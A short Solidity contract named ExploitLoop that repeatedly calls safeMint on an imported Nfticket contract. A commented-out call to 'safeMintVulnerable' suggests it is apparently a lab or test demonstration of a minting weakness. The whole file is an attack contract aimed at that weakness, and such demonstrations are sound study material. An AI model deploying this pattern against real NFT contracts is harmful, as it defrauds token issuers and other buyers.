// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "Nfticket.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ExploitLoop  is IERC721Receiver {
    address payable contractAddress;
    Nfticket public nfticket;

    constructor(address payable _addr) {
        nfticket = Nfticket(_addr);
    }

    function onERC721Received(address operator, address from, uint256 tokenId,  bytes memory) external pure override returns (bytes4)  {
       return IERC721Receiver.onERC721Received.selector;
    }
    function attackVulnerable() external payable {
        for (uint256 i=0; i < 2; i++) 
        {
            require(msg.value >0, "no ether supplied");
            nfticket.safeMint(payable(address(this)), "abc", 1);
            // nfticket.safeMintVulnerable(payable(address(this)), "abc", 1);
        }
}
}